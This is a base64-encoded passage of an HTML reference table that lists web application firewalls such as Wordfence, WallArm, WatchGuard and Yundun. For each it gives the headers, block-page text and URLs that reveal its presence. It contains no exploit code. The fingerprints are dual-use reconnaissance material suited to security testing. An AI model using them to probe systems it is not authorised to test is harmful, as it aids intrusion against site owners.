ZT4gYXMgaGVhZGluZy48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8
bGk+PGNvZGU+TW9kdWxlOiBJSVMgV2ViIENvcmU8L2NvZGU+IGluIHRhYmxl
LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAg
IDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBVU1Ag
U2VjdXJlIEVudHJ5CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+TW9kZXJhdGU8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxi
PkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAg
ICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVzcG9uc2UgaGVh
ZGVycyBjb250YWluIDxjb2RlPlNlY3VyZSBFbnRyeSBTZXJ2ZXI8L2NvZGU+
IGZpZWxkIHZhbHVlLjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAg
ICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRy
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgVmFybmlzaCAoT1dBU1ApCiAg
ICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAg
ICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwv
bGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9s
b2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5NYWxpY2lvdXMgcmVxdWVzdCByZXR1cm5zIDxjb2Rl
PjQwNCBOb3QgRm91bmQ8L2NvZGU+IEVycm9yLjwvbGk+CiAgICAgICAgICAg
ICAgICAgICAgPGxpPlJlc3BvbnNlIHBhZ2UgY29udGFpbnM6PC9saT4KICAg
ICAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgICAg
IDxsaT48Y29kZT5SZXF1ZXN0IHJlamVjdGVkIGJ5IHhWYXJuaXNoLVdBRjwv
Y29kZT4gdGV4dCBzbmlwcGV0LjwvbGk+CiAgICAgICAgICAgICAgICAgICAg
PC91bD4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+
CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRk
PgogICAgICAgICAgICBWYXJuaXNoIENhY2hlV2FsbAogICAgICAgIDwvdGQ+
CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAg
ICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAg
ICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9s
aT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8
bGk+UmVzcG9uc2UgcGFnZSBjb250YWluczo8L2xpPgogICAgICAgICAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2Rl
PkVycm9yIDQwMyBOYXVnaHR5LCBub3QgTmljZSE8L2NvZGU+IGFzIGhlYWRp
bmcuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlZh
cm5pc2ggY2FjaGUgU2VydmVyPC9jb2RlPiBhcyB0ZXh0LjwvbGk+CiAgICAg
ICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8
dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBWaWV0dGVsCiAgICAgICAg
PC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5Ojwv
Yj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
ICAgIDxsaT5SZXNwb25zZSBwYWdlIGNvbnRhaW5zOjwvbGk+CiAgICAgICAg
ICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+
QmxvY2sgcGFnZSBoYXMgdGl0bGUgc2V0IHRvIDxjb2RlPkFjY2VzcyBkZW5p
ZWQgwrcgVmlldHRlbCBXQUY8L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgICAgIDxsaT5SZWZlcmVuY2UgdG8gPGNvZGU+aHR0cHM6Ly9jbG91
ZHJpdHkuY29tLnZuLzwvY29kZT4gVVJMLjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgICAgIDxsaT5SZXNwb25zZSBwYWdlIGNvbnRhaW5zIGtleXdvcmRz
IDxjb2RlPlZpZXR0ZWwgV0FGIHN5c3RlbTwvY29kZT4uPC9saT4KICAgICAg
ICAgICAgICAgICAgICAgICAgPGxpPkNvbnRhY3QgaW5mb3JtYXRpb24gcmVm
ZXJlbmNlIHRvIDxjb2RlPmh0dHBzOi8vY2xvdWRyaXR5LmNvbS52bi9jdXN0
b21lci8jL2NvbnRhY3Q8L2NvZGU+IFVSTC48L2xpPgogICAgICAgICAgICAg
ICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAg
ICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPiAKICAgIDx0cj4KICAg
ICAgICA8dGQ+CiAgICAgICAgICAgIFZpcnVzRGllCiAgICAgICAgPC90ZD4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
IDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xp
PgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxs
aT5SZXNwb25zZSBwYWdlIGNvbnRhaW5zOjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+
aHR0cDovL2Nkbi52aXJ1c2RpZS5ydS9zcGxhc2gvZmlyZXdhbGxzdG9wLnBu
ZzwvY29kZT4gcGljdHVyZS48L2xpPgogICAgICAgICAgICAgICAgICAgICAg
ICA8bGk+PGNvZGU+Y29weTsgVmlydXNkaWUucnU8L3A+PC9jb2RlPiBjb3B5
cmlnaHQgbm90aWNlLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxs
aT5SZXNwb25zZSBwYWdlIHRpdGxlIGNvbnRhaW5zIDxjb2RlPlZpcnVzZGll
PC9jb2RlPiBrZXl3b3JkLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAg
IDxsaT5QYWdlIG1ldGFkYXRhIGNvbnRhaW5zIDxjb2RlPm5hbWU9IkZXX0JM
T0NLIjwvY29kZT4ga2V5d29yZDwvbGk+CiAgICAgICAgICAgICAgICAgICAg
PC91bD4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+
CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRk
PgogICAgICAgICAgICBXYWxsQXJtCiAgICAgICAgPC90ZD4KICAgICAgICA8
dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3RhYmlsaXR5OiA8L2I+TW9kZXJhdGU8L2xpPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAg
ICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNv
ZGU+U2VydmVyPC9jb2RlPiBoZWFkZXJzIGNvbnRhaW4gPGNvZGU+bmdpbngt
d2FsbGFybTwvY29kZT4gdmFsdWUuPC9saT4KICAgICAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+
CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBXYXRjaEd1YXJk
IElQUwogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8
dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9i
PkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBN
ZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAg
ICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFk
ZXJzIG1heSBjb250YWluIDxjb2RlPldhdGNoR3VhcmQ8L2NvZGU+IGZpZWxk
IHZhbHVlLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQg
cmVzcG9uc2UgcGFnZSBjb250YWluczogPC9saT4KICAgICAgICAgICAgICAg
ICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5S
ZXF1ZXN0IGRlbmllZCBieSBXYXRjaEd1YXJkIEZpcmV3YWxsPC9jb2RlPiB0
ZXh0LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5X
YXRjaEd1YXJkIFRlY2hub2xvZ2llcyBJbmMuPC9jb2RlPiBhcyBmb290ZXIu
PC9saT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAg
ICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAg
PC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIFdlYkFS
WCBTZWN1cml0eQogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAg
ICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0
eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVj
dGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1
bD4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVzdHJpY3RlZCB0byBzcGVj
aWZpY2FsbHkgV29yZFByZXNzIHNpdGVzIG9ubHkuPC9saT4KICAgICAgICAg
ICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5z
OiA8L2xpPgogICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgICAgICAgICAgPGxpPjxjb2RlPlRoaXMgcmVxdWVzdCBoYXMgYmVlbiBi
bG9ja2VkIGJ5IFdlYkFSWCBXZWIgQXBwbGljYXRpb24gRmlyZXdhbGw8L2Nv
ZGU+IHRleHQuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPlJl
ZmVyZW5jZSB0byA8Y29kZT4vd3AtY29udGVudC9wbHVnaW5zL3dlYmFyeC88
L2NvZGU+IGRpcmVjdG9yeSB3aGVyZSBpdCBpcyBpbnN0YWxsZWQuPC9saT4K
ICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPC91
bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4K
ICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIFdlYktuaWdodAog
ICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8
L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2Rv
bG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgICAgICA8bGk+UmVzcG9uc2UgaGVhZGVycyBjb250YWluIDxjb2Rl
PldlYktuaWdodDwvY29kZT4ga2V5d29yZC48L2xpPgogICAgICAgICAgICAg
ICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnM6PC9s
aT4KICAgICAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAg
ICAgICAgIDxsaT48Y29kZT5XZWJLbmlnaHQgQXBwbGljYXRpb24gRmlyZXdh
bGwgQWxlcnQ8L2NvZGU+IHRleHQgd2FybmluZy48L2xpPgogICAgICAgICAg
ICAgICAgICAgICAgICA8bGk+PGNvZGU+QVFUUk9OSVggV2ViS25pZ2h0PC9j
b2RlPiB0ZXh0IHNuaXBwZXQuPC9saT4KICAgICAgICAgICAgICAgICAgICA8
L3VsPgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNl
IGNvZGUgcmV0dXJuZWQgaXMgPGNvZGU+OTk5IE5vIEhhY2tpbmc8L2NvZGU+
LiA6cDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVz
cG9uc2UgY29kZSByZXR1cm5lZCBpcyBhbHNvIDxjb2RlPjQwNCBIYWNrIE5v
dCBGb3VuZDwvY29kZT4uIDpwPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+
CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAg
ICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBXZWJMYW5kCiAgICAg
ICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAg
ICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+
CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5
OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBjb250YWlu
cyA8Y29kZT5BcGFjaGUgUHJvdGVjdGVkIEJ5IFdlYkxhbmQgV0FGPC9jb2Rl
PiBrZXl3b3JkLjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAg
ICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgog
ICAgICAgIDx0ZD4KICAgICAgICAgICAgV2ViUmF5CiAgICAgICAgPC90ZD4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
IDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xp
PgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxs
aT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBjb250YWlucyA8Y29kZT5X
ZWJSYXktV0FGPC9jb2RlPiBrZXl3b3JkLjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgPGxpPlJlc3BvbnNlIGhlYWRlcnMgbWF5IGhhdmUgPGNvZGU+RHJp
dmVkQnk8L2NvZGU+IGZpZWxkIHdpdGggdmFsdWUgPGNvZGU+UmF5U3J2IFJh
eUVuZy97dmVyc2lvbn08L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICA8
L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3Ry
PgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgV2ViU0VBTAog
ICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8
L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2Rv
bG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgY29u
dGFpbiA8Y29kZT5XZWJTRUFMPC9jb2RlPiBrZXl3b3JkLjwvbGk+CiAgICAg
ICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250
YWluczo8L2xpPgogICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgICAgICAgICAgPGxpPjxjb2RlPlRoaXMgaXMgYSBXZWJTRUFMIGVy
cm9yIG1lc3NhZ2UgdGVtcGxhdGUgZmlsZTwvY29kZT4gdGV4dC48L2xpPgog
ICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+V2ViU0VBTCBzZXJ2
ZXIgcmVjZWl2ZWQgYW4gaW52YWxpZCBIVFRQIHJlcXVlc3Q8L2NvZGU+IHRl
eHQgc25pcHBldC48L2xpPgogICAgICAgICAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAg
IDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAg
ICAgICAgV2ViVG90ZW0KICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFi
aWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAg
ICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9u
c2UgcGFnZSBjb250YWlucyA8Y29kZT5UaGUgY3VycmVudCByZXF1ZXN0IHdh
cyBibG9ja2VkIGJ5IFdlYlRvdGVtPC9jb2RlPi48L2xpPgogICAgICAgICAg
ICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgog
ICAgPC90cj4gICAgCiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAg
ICBXZXN0MjYzQ0ROCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXJz
IGNvbnRhaW4gPGNvZGU+WC1DYWNoZTwvY29kZT4gaGVhZGVyIGZpZWxkIHdp
dGggPGNvZGU+V1QyNjNDRE48L2NvZGU+IHZhbHVlLjwvbGk+CiAgICAgICAg
ICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+
CiAgICA8L3RyPiAgICAKICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAg
ICAgIFdvcmRmZW5jZQogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAg
ICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJp
bGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRl
dGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAg
IDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVzcG9uc2UgaGVhZGVy
cyBjb250YWluIDxjb2RlPldlYktuaWdodDwvY29kZT4ga2V5d29yZC48L2xp
PgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBh
Z2UgY29udGFpbnM6PC9saT4KICAgICAgICAgICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5HZW5lcmF0ZWQgYnkg
V29yZGZlbmNlPC9jb2RlPiB0ZXh0IHNuaXBwZXQuPC9saT4KICAgICAgICAg
ICAgICAgICAgICAgICAgPGxpPjxjb2RlPkEgcG90ZW50aWFsbHkgdW5zYWZl
IG9wZXJhdGlvbiBoYXMgYmVlbiBkZXRlY3RlZCBpbiB5b3VyIHJlcXVlc3Qg
dG8gdGhpcyBzaXRlPC9jb2RlPiB0ZXh0IHdhcm5pbmcuPC9saT4KICAgICAg
ICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPllvdXIgYWNjZXNzIHRvIHRo
aXMgc2l0ZSBoYXMgYmVlbiBsaW1pdGVkPC9jb2RlPiB0ZXh0IHdhcm5pbmcu
PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlRoaXMg
cmVzcG9uc2Ugd2FzIGdlbmVyYXRlZCBieSBXb3JkZmVuY2U8L2NvZGU+IHRl
eHQgc25pcHBldC48L2xpPgogICAgICAgICAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAg
IDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAg
ICAgICAgV1RTLVdBRgogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAg
ICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJp
bGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRl
dGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAg
IDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25z
ZSBwYWdlIHRpdGxlIGhhcyA8Y29kZT5XVFMtV0FGPC9jb2RlPiBrZXl3b3Jk
LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNlcnZlcjwv
Y29kZT4gaGVhZGVyIGNvbnRhaW5zIDxjb2RlPnd0czwvY29kZT4gYXMgdmFs
dWUuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+ICAgCiAgICA8dHI+CiAgICAg
ICAgPHRkPgogICAgICAgICAgICBYTGFicyBTZWN1cml0eSBXQUYKICAgICAg
ICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5FYXN5PC9saT4K
ICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6
PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAg
ICAgICAgPGxpPlJlc3BvbnNlIGhlYWRlcnMgY29udGFpbiA8Y29kZT5YLUNE
TjwvY29kZT4gaGVhZGVyIGZpZWxkIHdpdGggPGNvZGU+WExhYnMgU2VjdXJp
dHk8L2NvZGU+IHZhbHVlLjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgog
ICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPiAgICAK
ICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIFh1YW53dWR1biBX
QUYKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVs
PgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5F
YXN5PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0
aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAg
ICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250
YWlucyByZWZlcmVuY2UgdG8gPGNvZGU+aHR0cDovL2FkbWluLmRiYXBwd2Fm
LmNuL2luZGV4LnBocC9BZG1pbi9DbGllbnRNaXNpbmZvcm0vPC9jb2RlPiBz
aXRlIFVSTC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAg
ICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAg
ICAgICA8dGQ+CiAgICAgICAgICAgIFl1bmFxIENodWFuZ3l1CiAgICAgICAg
PC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+TW9kZXJhdGU8L2xp
PgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9n
eTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgICAgICA8bGk+UmVzcG9uc2UgcGFnZSBoYXMgcmVmZXJlbmNlIHRvOgog
ICAgICAgICAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+MzY1Y3lkLmNvbTwvY29kZT4gb3IgPGNv
ZGU+MzY1Y3lkLm5ldDwvY29kZT4gVVJMLjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgICAgICAgICA8bGk+UmVmZXJlbmNlIHRvIGhlbHAgcGFnZSBhdCA8
Y29kZT5odHRwOi8vaGVscC4zNjVjeWQuY29tL2N5ZC1lcnJvci1oZWxwLmh0
bWw/Y29kZT00MDM8L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAg
ICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4K
ICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBZ
dW5kdW4KICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwv
Yj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24g
TWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNlcnZlcjwvY29kZT4gaGVh
ZGVyIGNvbnRhaW5zIDxjb2RlPllVTkRVTjwvY29kZT4gYXMgdmFsdWUuPC9s
aT4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+WC1DYWNoZTwvY29k
ZT4gaGVhZGVyIGZpZWxkIGNvbnRhaW5zIDxjb2RlPllVTkRVTjwvY29kZT4g
YXMgdmFsdWUuPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVzcG9u
c2UgcGFnZSBjb250YWlucyA8Y29kZT5CbG9ja2VkIGJ5IFlVTkRVTiBDbG91
ZCBXQUY8L2NvZGU+IHRleHQgc25pcHBldC48L2xpPgogICAgICAgICAgICAg
ICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnMgcmVm
ZXJlbmNlIHRvIDxjb2RlPnl1bmR1bi5jb20veWRfaHR0cF9lcnJvci88L2Nv
ZGU+IFVSTC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAg
ICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAg
ICAgICA8dGQ+CiAgICAgICAgICAgIFl1bnN1bwogICAgICAgIDwvdGQ+CiAg
ICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8
bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAg
ICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4K
ICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+
QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5zIGltYWdlIGNsYXNzIHJl
ZmVyZW5jZSB0byA8Y29kZT55dW5zdW9sb2dvPC9jb2RlPi48L2xpPgogICAg
ICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXJzIGNvbnRhaW4g
